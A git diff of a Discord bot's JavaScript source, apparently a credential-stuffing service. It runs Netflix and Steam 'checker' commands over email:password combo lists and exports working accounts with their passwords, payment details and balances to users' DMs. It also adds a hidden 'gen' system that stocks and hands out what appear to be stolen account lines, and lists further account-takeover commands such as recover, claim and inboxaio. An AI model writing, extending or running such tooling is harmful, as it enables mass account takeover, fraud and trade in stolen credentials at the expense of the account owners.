-    const { AttachmentBuilder } = require("discord.js");
     const { buildZipBuffer } = require("./utils/zip-builder");
     const zipBuffer = buildZipBuffer(zipEntries);
     const zipFile = new AttachmentBuilder(zipBuffer, { name: "inboxaio_results.zip" });
@@ -1552,7 +831,7 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
     if (dmUser) {
       try {
         await dmUser.send({ embeds: [embed], files: [zipFile] });
-        await msg.edit({ embeds: [infoEmbed("Inbox AIO Complete", `Scanned ${results.length} accounts across ${getServiceCount()} services. Results sent to your DMs as a ZIP file.`)], components: [] });
+        await msg.edit({ embeds: [infoEmbed("Inbox AIO Complete", `Scanned ${results.length} accounts across ${getServiceCount()} services. Results sent to your DMs.`)], components: [] });
       } catch {
         await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
       }
@@ -1561,7 +840,6 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
     }
 
     statsManager.record(userId, "inboxaio", hitResults.length);
-
   } catch (err) {
     await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
   } finally {
@@ -1570,38 +848,27 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
   }
 }
 
-// ── Netflix Checker handler ─────────────────────────────────
+// ── Netflix ─────────────────────────────────────────────────
 
 async function handleNetflix(respond, userId, accountsRaw, accountsFile, threads = 10, dmUser = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
-
   const acquire = limiter.acquire(userId, "netflix");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
 
   try {
-    let accounts = splitInput(accountsRaw);
-    if (accountsFile) accounts = accounts.concat(await fetchAttachmentLines(accountsFile));
-    accounts = accounts.filter((a) => a.includes(":"));
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided. Use email:password format.")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts (max ${MAX_COMBO_LINES}).`)] });
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
 
     const nfxStats = { premium: 0, standard: 0, basic: 0, free: 0, cancelled: 0, invalid: 0, blocked: 0, timeout: 0, errors: 0 };
     let hits = [];
-
     const msg = await respond({ embeds: [netflixProgressEmbed(0, accounts.length, nfxStats)], components: [stopButton(userId)], fetchReply: true });
     const start = Date.now();
     let lastUpdate = 0;
 
-    const results = await checkNetflixAccounts(accounts, Math.min(threads, 10), (checked, total, result) => {
+    await checkNetflixAccounts(accounts, Math.min(threads, 10), (checked, total, result) => {
       if (result) {
         if (result.status === "hit") {
           hits.push(result);
@@ -1617,7 +884,6 @@ async function handleNetflix(respond, userId, accountsRaw, accountsFile, threads
         else if (result.status === "timeout") nfxStats.timeout++;
         else nfxStats.errors++;
       }
-
       const now = Date.now();
       if (now - lastUpdate > 3000) {
         lastUpdate = now;
@@ -1626,11 +892,7 @@ async function handleNetflix(respond, userId, accountsRaw, accountsFile, threads
     }, ac.signal);
 
     const elapsed = Math.round((Date.now() - start) / 1000);
-
-    // Build result files
-    const { AttachmentBuilder } = require("discord.js");
     const files = [];
-
     if (hits.length > 0) {
       const allHits = hits.map((h) =>
         `Email: ${h.email}\nPassword: ${h.password}\nPlan: ${h.plan}\nStatus: ${h.accountStatus}\nPayment: ${h.payment}\nNext Billing: ${h.nextBilling}\nProfiles: ${h.profiles}\nCountry: ${h.country}\nCreated: ${h.created}\n${"=".repeat(30)}`
@@ -1639,32 +901,22 @@ async function handleNetflix(respond, userId, accountsRaw, accountsFile, threads
     }
 
     const embed = netflixResultsEmbed({
-      total: accounts.length,
-      hits: hits.length,
-      invalid: nfxStats.invalid,
-      blocked: nfxStats.blocked,
-      timeout: nfxStats.timeout,
-      errors: nfxStats.errors,
-      premium: nfxStats.premium,
-      standard: nfxStats.standard,
-      basic: nfxStats.basic,
-      free: nfxStats.free,
-      cancelled: nfxStats.cancelled,
-      elapsed,
-      username: dmUser?.username,
+      total: accounts.length, hits: hits.length,
+      invalid: nfxStats.invalid, blocked: nfxStats.blocked, timeout: nfxStats.timeout, errors: nfxStats.errors,
+      premium: nfxStats.premium, standard: nfxStats.standard, basic: nfxStats.basic, free: nfxStats.free, cancelled: nfxStats.cancelled,
+      elapsed, username: dmUser?.username,
     });
 
     if (dmUser) {
       try {
         await dmUser.send({ embeds: [embed], files });
-        await msg.edit({ embeds: [infoEmbed("Netflix Checker Complete", `Checked ${accounts.length} accounts. ${hits.length} hits found. Results sent to your DMs.`)], components: [] });
+        await msg.edit({ embeds: [infoEmbed("Netflix Checker Complete", `Checked ${accounts.length}. ${hits.length} hits. Sent to DMs.`)], components: [] });
       } catch {
         await msg.edit({ embeds: [embed], files, components: [] });
       }
     } else {
       await msg.edit({ embeds: [embed], files, components: [] });
     }
-
     statsManager.record(userId, "netflix", hits.length);
   } catch (err) {
     await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
@@ -1674,45 +926,28 @@ async function handleNetflix(respond, userId, accountsRaw, accountsFile, threads
   }
 }
 
-// ── Steam Checker handler ───────────────────────────────────
+// ── Steam ───────────────────────────────────────────────────
 
 async function handleSteam(respond, userId, accountsRaw, accountsFile, threads = 15, dmUser = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
-
   const acquire = limiter.acquire(userId, "steam");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
 
   try {
-    let accounts = splitInput(accountsRaw);
-    if (accountsFile) accounts = accounts.concat(await fetchAttachmentLines(accountsFile));
-    accounts = accounts.filter((a) => a.includes(":"));
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided. Use user:password format.")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts (max ${MAX_COMBO_LINES}).`)] });
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
 
     const stStats = { valid: 0, invalid: 0 };
     let hits = [];
-
     const msg = await respond({ embeds: [steamProgressEmbed(0, accounts.length, stStats)], components: [stopButton(userId)], fetchReply: true });
     const start = Date.now();
     let lastUpdate = 0;
 
-    const results = await checkSteamAccounts(accounts, Math.min(threads, 15), (checked, total, result) => {
-      if (result) {
-        stStats.valid++;
-        hits.push(result);
-      } else {
-        stStats.invalid++;
-      }
-
+    await checkSteamAccounts(accounts, Math.min(threads, 15), (checked, total, result) => {
+      if (result) { stStats.valid++; hits.push(result); } else stStats.invalid++;
       const now = Date.now();
       if (now - lastUpdate > 3000) {
         lastUpdate = now;
@@ -1721,51 +956,30 @@ async function handleSteam(respond, userId, accountsRaw, accountsFile, threads =
     }, ac.signal);
 
     const elapsed = Math.round((Date.now() - start) / 1000);
-
-    // Build result files
-    const { AttachmentBuilder } = require("discord.js");
     const files = [];
-
     if (hits.length > 0) {
       const allHits = hits.map((h) => {
         const gamesList = shortenGames(h.games, 10);
         return `Username: ${h.username}\nPassword: ${h.password}\nEmail: ${h.email}\nBalance: ${h.balance}\nCountry: ${h.country}\nTotal Games: ${h.totalGames}\nGames: ${gamesList}\nLevel: ${h.level}\nLimited: ${h.limited}\nVAC Bans: ${h.vacBans}\nGame Bans: ${h.gameBans}\nCommunity Ban: ${h.communityBan}\n${"=".repeat(30)}`;
       }).join("\n\n");
       files.push(new AttachmentBuilder(Buffer.from(allHits, "utf-8"), { name: "steam_hits.txt" }));
-
-      // Separate with/without email
       const withEmail = hits.filter((h) => h.email && h.email !== "Unknown");
       const withoutEmail = hits.filter((h) => !h.email || h.email === "Unknown");
-
-      if (withEmail.length > 0) {
-        const data = withEmail.map((h) => `${h.username}:${h.password}\n${h.email}:${h.password}`).join("\n");
-        files.push(new AttachmentBuilder(Buffer.from(data, "utf-8"), { name: "valid_with_email.txt" }));
-      }
-      if (withoutEmail.length > 0) {
-        const data = withoutEmail.map((h) => `${h.username}:${h.password}`).join("\n");
-        files.push(new AttachmentBuilder(Buffer.from(data, "utf-8"), { name: "valid_without_email.txt" }));
-      }
+      if (withEmail.length > 0) files.push(new AttachmentBuilder(Buffer.from(withEmail.map((h) => `${h.username}:${h.password}\n${h.email}:${h.password}`).join("\n"), "utf-8"), { name: "valid_with_email.txt" }));
+      if (withoutEmail.length > 0) files.push(new AttachmentBuilder(Buffer.from(withoutEmail.map((h) => `${h.username}:${h.password}`).join("\n"), "utf-8"), { name: "valid_without_email.txt" }));
     }
 
-    const embed = steamResultsEmbed({
-      total: accounts.length,
-      valid: stStats.valid,
-      invalid: stStats.invalid,
-      elapsed,
-      username: dmUser?.username,
-    });
-
+    const embed = steamResultsEmbed({ total: accounts.length, valid: stStats.valid, invalid: stStats.invalid, elapsed, username: dmUser?.username });
     if (dmUser) {
       try {
         await dmUser.send({ embeds: [embed], files });
-        await msg.edit({ embeds: [infoEmbed("Steam Checker Complete", `Checked ${accounts.length} accounts. ${stStats.valid} valid found. Results sent to your DMs.`)], components: [] });
+        await msg.edit({ embeds: [infoEmbed("Steam Checker Complete", `Checked ${accounts.length}. ${stStats.valid} valid. Sent to DMs.`)], components: [] });
       } catch {
         await msg.edit({ embeds: [embed], files, components: [] });
       }
     } else {
       await msg.edit({ embeds: [embed], files, components: [] });
     }
-
     statsManager.record(userId, "steam", stStats.valid);
   } catch (err) {
     await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
@@ -1775,11 +989,138 @@ async function handleSteam(respond, userId, accountsRaw, accountsFile, threads =
   }
 }
 
+// ── Admin Panel ─────────────────────────────────────────────
+
+async function handleAdminPanel(respond, callerId) {
+  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can view the admin panel.")] });
+  return respond({ embeds: [adminPanelEmbed({
+    webhookSet: !!webhookUrl,
+    proxyEnabled: isProxyEnabled(),
+    proxyCount: getProxyCount(),
+    autopilot: autopilot.isEnabled(),
+    antilinkChannels: (config.ANTILINK_CHANNELS || []).length,
+    whitelistCount: antilink.list().length,
+  })] });
+}
+
+async function handleSetWebhook(respond, callerId, url) {
+  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can set the webhook.")] });
+  if (!url || !/^https?:\/\//.test(url)) return respond({ embeds: [errorEmbed("Invalid URL.")] });
+  webhookUrl = url;
+  return respond({ embeds: [successEmbed("Webhook URL updated.")] });
+}
+
+async function handleBotStats(respond, callerId) {
+  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can view detailed stats.")] });
+  return respond({ embeds: [detailedStatsEmbed(statsManager.getSummary())] });
+}
+
+// ── Gen System ──────────────────────────────────────────────
+
+async function handleGen(respond, userId, args, attachment) {
+  // .gen help
+  if (args[0]?.toLowerCase() === "help") {
+    try { await respond({ embeds: [genHelpEmbed(config.PREFIX)] }); } catch {}
+    return;
+  }
+
+  const product = args[0];
+  const amount = parseInt(args[1] || "1", 10);
+  if (!product || isNaN(amount)) {
+    return respond({ embeds: [errorEmbed(`Usage: \`${config.PREFIX}gen <product> <amount>\` — see \`${config.PREFIX}gen help\``)] });
+  }
+
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed("You are not authorized to use this bot.")] });
+
+  const result = gen.generate(userId, product, amount, isOwner(userId));
+  if (!result.ok) return respond({ embeds: [errorEmbed(result.reason)] });
+
+  const file = textAttachment(result.items, `${product}_${result.items.length}.txt`);
+  try {
+    const userObj = await client.users.fetch(userId);
+    await userObj.send({
+      embeds: [successEmbed(`Generated **${result.delivered}** × \`${product}\` (requested ${result.requested}).\nRemaining stock: \`${gen.count(product)}\``)],
+      files: [file],
+    });
+    return respond({ embeds: [infoEmbed("Gen Sent", `Sent **${result.delivered}** × \`${product}\` to your DMs.`)] });
+  } catch {
+    return respond({ embeds: [errorEmbed("Couldn't DM you. Enable DMs from server members.")] });
+  }
+}
+
+async function handleStock(respond) {
+  return respond({ embeds: [stockListEmbed(gen.list())] });
+}
+
+async function handleAddStock(respond, userId, product, attachment, inlineText) {
+  if (!product) return respond({ embeds: [errorEmbed(`Usage: \`${config.PREFIX}addstock <product>\` + attach .txt OR inline lines.`)] });
+  let text = inlineText || "";
+  if (attachment) text += "\n" + (await fetchAttachmentLines(attachment));
+  const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
+  if (lines.length === 0) return respond({ embeds: [errorEmbed("No lines found.")] });
+  const added = gen.addStock(product, lines);
+  return respond({ embeds: [successEmbed(`Added **${added}** new line(s) to \`${product.toLowerCase()}\`.\nTotal stock: \`${gen.count(product)}\``)] });
+}
+
+async function handleReplaceStock(respond, userId, product, attachment, inlineText) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Only the bot owner can replace stock.")] });
+  if (!product) return respond({ embeds: [errorEmbed(`Usage: \`${config.PREFIX}replacegenstock <product>\` + attach .txt`)] });
+  let text = inlineText || "";
+  if (attachment) text += "\n" + (await fetchAttachmentLines(attachment));
+  const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
+  if (lines.length === 0) return respond({ embeds: [errorEmbed("No lines found.")] });
+  const total = gen.replaceStock(product, lines);
+  return respond({ embeds: [successEmbed(`Replaced \`${product.toLowerCase()}\` stock — now **${total}** lines.`)] });
+}
+
+async function handleDownloadStock(respond, userId) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Only the bot owner can download stock.")] });
+  const dump = gen.dump();
+  if (!dump.trim()) return respond({ embeds: [infoEmbed("Gen Stock", "Stock is empty.")] });
+  const file = new AttachmentBuilder(Buffer.from(dump, "utf-8"), { name: "gen_stock.txt" });
+  try {
+    const userObj = await client.users.fetch(userId);
+    await userObj.send({ content: "Current gen stock:", files: [file] });
+    return respond({ embeds: [infoEmbed("Sent", "Stock dump sent to your DMs.")] });
+  } catch {
+    return respond({ files: [file] });
+  }
+}
+
+// ── Anti-Link + Autopilot helpers ───────────────────────────
+
+async function maybeHandleAntiLink(message) {
+  if (!antilink.isProtectedChannel(message.channelId)) return false;
+  if (!antilink.containsLink(message.content)) return false;
+  if (isOwner(message.author.id)) return false;
+  if (antilink.isWhitelisted(message.author.id)) return false;
+  try { await message.delete(); } catch {}
+  try { await message.channel.send({ content: `<@${message.author.id}> nice try diddy.. no links allowed` }); } catch {}
+  return true;
+}
+
+async function maybeSendUnauthorisedWarning(message) {
+  if (!autopilot.isEnabled()) return false;
+  try {
+    const sent = await message.reply({ embeds: [unauthorisedEmbed()] });
+    autopilot.registerWarning(message.author.id, message.channelId, sent.id);
+  } catch {}
+  return true;
+}
+
+async function maybeHandleMilkReply(message) {
+  if (!autopilot.isMilkReply(message)) return false;
+  autopilot.consume(message.author.id);
+  auth.authorize(message.author.id, TEN_DAYS_MS, "autopilot");
+  try {
+    await message.reply({ embeds: [successEmbed(`Auto access granted for **10 days**. Welcome <@${message.author.id}>.`)] });
+  } catch {}
+  return true;
+}
+
 // ── Slash Commands ───────────────────────────────────────────
 
-
 client.on("interactionCreate", async (interaction) => {
-  // Handle stop button clicks
   if (interaction.isButton() && interaction.customId.startsWith("stop_")) {
     const targetUserId = interaction.customId.replace("stop_", "");
     if (interaction.user.id !== targetUserId && !isOwner(interaction.user.id)) {
@@ -1788,18 +1129,16 @@ client.on("interactionCreate", async (interaction) => {
     const ac = activeAborts.get(targetUserId);
     if (ac) {
       ac.abort();
-      await interaction.reply({ embeds: [infoEmbed("Stopped", "Process is stopping. Partial results will be shown.")], ephemeral: true });
+      await interaction.reply({ embeds: [infoEmbed("Stopped", "Process is stopping.")], ephemeral: true });
     } else {
       await interaction.reply({ content: "No active process found.", ephemeral: true });
     }
     return;
   }
 
-  // Handle help category select menu
   if (interaction.isStringSelectMenu() && interaction.customId === "help_category") {
     const category = interaction.values[0];
-    const prefix = config.PREFIX;
-    await interaction.update({ embeds: [helpCategoryEmbed(category, prefix)], components: [helpSelectMenu()] });
+    await interaction.update({ embeds: [helpCategoryEmbed(category, config.PREFIX)], components: [helpSelectMenu()] });
     return;
   }
 
@@ -1807,7 +1146,6 @@ client.on("interactionCreate", async (interaction) => {
 
   const { commandName, user } = interaction;
 
-  // Per-command channel enforcement
   const channelCheck = checkChannelAccess(interaction.channelId, commandName);
   if (!channelCheck.allowed) {
     return interaction.reply({
@@ -1821,185 +1159,96 @@ client.on("interactionCreate", async (interaction) => {
     return interaction.reply(opts);
   };
 
-  // Send welcome on first use (to DMs)
-  await sendWelcomeIfNeeded(async (opts) => {
-    try { await user.send(opts); } catch {}
-  }, user.id, user.username);
+  await sendWelcomeIfNeeded(user.id, user.username, user);
 
   try {
     if (commandName === "check") {
       await interaction.deferReply();
-      const wlids = interaction.options.getString("wlids");
-      const codes = interaction.options.getString("codes");
-      const codesFile = interaction.options.getAttachment("codes_file");
-      const threads = interaction.options.getInteger("threads") || 10;
-      await handleCheck(respond, user.id, wlids, codes, codesFile, threads, user);
-    }
-
-    else if (commandName === "claim") {
+      await handleCheck(respond, user.id,
+        interaction.options.getString("wlids"),
+        interaction.options.getString("codes"),
+        interaction.options.getAttachment("codes_file"),
+        interaction.options.getInteger("threads") || 10,
+        user);
+    } else if (commandName === "claim") {
       await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 5;
-      await handleClaim(respond, user.id, accounts, accountsFile, threads, user);
-    }
-
-    else if (commandName === "pull") {
+      await handleClaim(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 5,
+        user);
+    } else if (commandName === "pull") {
       await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      await handlePull(respond, user.id, accounts, accountsFile, user, user.username);
-    }
-
-    else if (commandName === "promopuller") {
+      await handlePull(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        user, user.username);
+    } else if (commandName === "promopuller") {
       await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      await handlePromoPuller(respond, user.id, accounts, accountsFile, user, user.username);
-    }
-
-    else if (commandName === "inboxaio") {
+      await handlePromoPuller(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        user, user.username);
+    } else if (commandName === "inboxaio") {
       await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 5;
-      await handleInboxAio(respond, user.id, accounts, accountsFile, threads, user);
-    }
-
-    else if (commandName === "wlidset") {
-      const wlids = interaction.options.getString("wlids");
-      const wlidsFile = interaction.options.getAttachment("wlids_file");
-      await handleWlidSet(respond, user.id, wlids, wlidsFile);
-    }
-
-    else if (commandName === "auth") {
-      const target = interaction.options.getUser("user");
-      const duration = interaction.options.getString("duration");
-      await handleAuth(respond, user.id, target.id, duration);
-    }
-
-    else if (commandName === "deauth") {
-      const target = interaction.options.getUser("user");
-      await handleDeauth(respond, user.id, target.id);
-    }
-
-    else if (commandName === "authlist") {
+      await handleInboxAio(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 3,
+        user);
+    } else if (commandName === "wlidset") {
+      await handleWlidSet(respond, user.id,
+        interaction.options.getString("wlids"),
+        interaction.options.getAttachment("wlids_file"));
+    } else if (commandName === "auth") {
+      await handleAuth(respond, user.id, interaction.options.getUser("user").id, interaction.options.getString("duration"));
+    } else if (commandName === "deauth") {
+      await handleDeauth(respond, user.id, interaction.options.getUser("user").id);
+    } else if (commandName === "authlist") {
       await handleAuthList(respond);
-    }
-
-    else if (commandName === "blacklist") {
-      const target = interaction.options.getUser("user");
-      const reason = interaction.options.getString("reason");
-      await handleBlacklist(respond, user.id, target.id, reason);
-    }
-
-    else if (commandName === "unblacklist") {
-      const target = interaction.options.getUser("user");
-      await handleUnblacklist(respond, user.id, target.id);
-    }
-
-    else if (commandName === "blacklistshow") {
+    } else if (commandName === "blacklist") {
+      await handleBlacklist(respond, user.id, interaction.options.getUser("user").id, interaction.options.getString("reason"));
+    } else if (commandName === "unblacklist") {
+      await handleUnblacklist(respond, user.id, interaction.options.getUser("user").id);
+    } else if (commandName === "blacklistshow") {
       await handleBlacklistShow(respond);
-    }
-
-    else if (commandName === "stats") {
+    } else if (commandName === "stats") {
       await handleStats(respond);
-    }
-
-    else if (commandName === "purchase") {
+    } else if (commandName === "refund") {
       await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const product = interaction.options.getString("product");
-      await handlePurchase(respond, user.id, accounts, accountsFile, product, user);
-    }
-
-    else if (commandName === "search") {
+      await handleRefund(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 5,
+        user, user.username);
+    } else if (commandName === "netflix") {
       await interaction.deferReply();
-      const query = interaction.options.getString("query");
-      await handleSearch(respond, query);
-    }
-
-    else if (commandName === "changer") {
+      await handleNetflix(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 10,
+        user);
+    } else if (commandName === "steam") {
       await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const newPassword = interaction.options.getString("new_password");
-      const threads = interaction.options.getInteger("threads") || 5;
-      await handleChanger(respond, user.id, accounts, accountsFile, newPassword, threads, user);
-    }
-
-    else if (commandName === "checker") {
-      await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 5;
-      await handleAccountChecker(respond, user.id, accounts, accountsFile, threads, user);
-    }
-
-    else if (commandName === "refund") {
-      await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 5;
-      await handleRefund(respond, user.id, accounts, accountsFile, threads, user, user.username);
-    }
-
-    else if (commandName === "netflix") {
-      await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 10;
-      await handleNetflix(respond, user.id, accounts, accountsFile, threads, user);
-    }
-
-    else if (commandName === "steam") {
-      await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 15;
-      await handleSteam(respond, user.id, accounts, accountsFile, threads, user);
-    }
-
-    else if (commandName === "help") {
+      await handleSteam(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 15,
+        user);
+    } else if (commandName === "help") {
       await respond({ embeds: [helpOverviewEmbed("/")], components: [helpSelectMenu()] });
-    }
-
-    else if (commandName === "rewards") {
+    } else if (commandName === "rewards") {
       await interaction.deferReply();
-      const accounts = interaction.options.getString("accounts");
-      const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 3;
-      await handleRewards(respond, user.id, accounts, accountsFile, threads, user);
-    }
-
-
-    else if (commandName === "recover") {
-      await interaction.deferReply();
-      const emailsRaw = interaction.options.getString("emails");
-      const emailsFile = interaction.options.getAttachment("emails_file");
-      const newPassword = interaction.options.getString("new_password");
-      const threads = interaction.options.getInteger("threads") || 1;
-      await handleRecover(respond, user.id, emailsRaw, emailsFile, newPassword, threads, user, interaction);
-    }
-
-    else if (commandName === "captcha") {
-      await interaction.deferReply();
-      const solution = interaction.options.getString("solution");
-      await handleCaptchaSolve(respond, user.id, solution);
-    }
-
-    // ── Admin commands ──
-    else if (commandName === "admin") {
+      await handleRewards(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 3,
+        user);
+    } else if (commandName === "admin") {
       await handleAdminPanel(respond, user.id);
-    }
-
-    else if (commandName === "setwebhook") {
-      const url = interaction.options.getString("url");
-      await handleSetWebhook(respond, user.id, url);
-    }
-
-    else if (commandName === "botstats") {
+    } else if (commandName === "setwebhook") {
+      await handleSetWebhook(respond, user.id, interaction.options.getString("url"));
+    } else if (commandName === "botstats") {
       await handleBotStats(respond, user.id);
     }
   } catch (err) {
@@ -2012,26 +1261,108 @@ client.on("interactionCreate", async (interaction) => {
 
 client.on("messageCreate", async (message) => {
   if (message.author.bot) return;
-  if (!message.content.startsWith(config.PREFIX)) return;
 
+  // 1) Anti-link enforcement (fires regardless of prefix)
+  if (await maybeHandleAntiLink(message)) return;
+
+  // 2) Autopilot "milk" reply — even without prefix
+  if (await maybeHandleMilkReply(message)) return;
+
+  if (!message.content.startsWith(config.PREFIX)) return;
 
   const args = message.content.slice(config.PREFIX.length).trim().split(/\s+/);
   const cmd = args.shift()?.toLowerCase();
   if (!cmd) return;
 
-  // Per-command channel enforcement
+  // ── Owner-only utility commands first (always allowed in any channel) ──
+  if (cmd === "say") {
+    if (!isOwner(message.author.id)) return;
+    const text = args.join(" ");
+    if (!text) return;
+    try { await message.delete(); } catch {}
+    try { await message.channel.send(text); } catch {}
+    return;
+  }
+
+  if (cmd === "dm") {
+    if (!isOwner(message.author.id)) return;
+    const targetRaw = args.shift();
+    const text = args.join(" ");
+    if (!targetRaw || !text) return message.reply({ embeds: [errorEmbed(`Usage: \`${config.PREFIX}dm <user|id> <message>\``)] });
+    const targetId = targetRaw.replace(/[<@!>]/g, "");
+    try {
+      const u = await client.users.fetch(targetId);
+      await u.send(text);
+      return message.reply({ embeds: [successEmbed(`DM sent to <@${targetId}>.`)] });
+    } catch {
+      return message.reply({ embeds: [errorEmbed("Couldn't DM that user.")] });
+    }
+  }
+
+  if (cmd === "autopilotoff") {
+    if (!isOwner(message.author.id)) return;
+    autopilot.setEnabled(false);
+    return message.reply({ embeds: [successEmbed("Autopilot access system **disabled**.")] });
+  }
+
+  if (cmd === "autopiloton") {
+    if (!isOwner(message.author.id)) return;
+    autopilot.setEnabled(true);
+    return message.reply({ embeds: [successEmbed("Autopilot access system **enabled**.")] });
+  }
+
+  if (cmd === "whitelist" || cmd === "antilinkwl") {
+    if (!isOwner(message.author.id)) return;
+    const targetRaw = args.shift();
+    if (!targetRaw) return message.reply({ embeds: [errorEmbed(`Usage: \`${config.PREFIX}whitelist <user|id>\``)] });
+    const targetId = targetRaw.replace(/[<@!>]/g, "");
+    const added = antilink.addWhitelist(targetId);
+    return message.reply({ embeds: [successEmbed(added ? `<@${targetId}> whitelisted from anti-link.` : `<@${targetId}> already whitelisted.`)] });
+  }
+
+  if (cmd === "unwhitelist" || cmd === "antilinkunwl") {
+    if (!isOwner(message.author.id)) return;
+    const targetRaw = args.shift();
+    if (!targetRaw) return message.reply({ embeds: [errorEmbed(`Usage: \`${config.PREFIX}unwhitelist <user|id>\``)] });
+    const targetId = targetRaw.replace(/[<@!>]/g, "");
+    const removed = antilink.removeWhitelist(targetId);
+    return message.reply({ embeds: [removed ? successEmbed(`<@${targetId}> removed from anti-link whitelist.`) : errorEmbed("That user wasn't whitelisted.")] });
+  }
+
+  // ── Gen system (hidden — works in any channel) ──
+  if (cmd === "gen") return handleGen((opts) => message.reply(opts), message.author.id, args, message.attachments.first());
+  if (cmd === "stock") return handleStock((opts) => message.reply(opts));
+  if (cmd === "addstock") {
+    const product = args.shift();
+    return handleAddStock((opts) => message.reply(opts), message.author.id, product, message.attachments.first(), args.join("\n"));
+  }
+  if (cmd === "replacegenstock") {
+    const product = args.shift();
+    return handleReplaceStock((opts) => message.reply(opts), message.author.id, product, message.attachments.first(), args.join("\n"));
+  }
+  if (cmd === "downloadgenstock") {
+    return handleDownloadStock((opts) => message.reply(opts), message.author.id);
+  }
+
+  // ── Channel enforcement for normal commands ──
   const channelCheck = checkChannelAccess(message.channelId, cmd);
   if (!channelCheck.allowed) {
-    return message.reply({
-      embeds: [errorEmbed(`This command can only be used in <#${channelCheck.requiredChannel}>.`)],
-    });
+    return message.reply({ embeds: [errorEmbed(`This command can only be used in <#${channelCheck.requiredChannel}>.`)] });
   }
 
   const respond = (opts) => message.reply(opts);
-  // Send welcome on first use
-  await sendWelcomeIfNeeded(async (opts) => {
-    try { await message.author.send(opts); } catch {}
-  }, message.author.id, message.author.username);
+
+  // First-use welcome DM
+  await sendWelcomeIfNeeded(message.author.id, message.author.username, message.author);
+
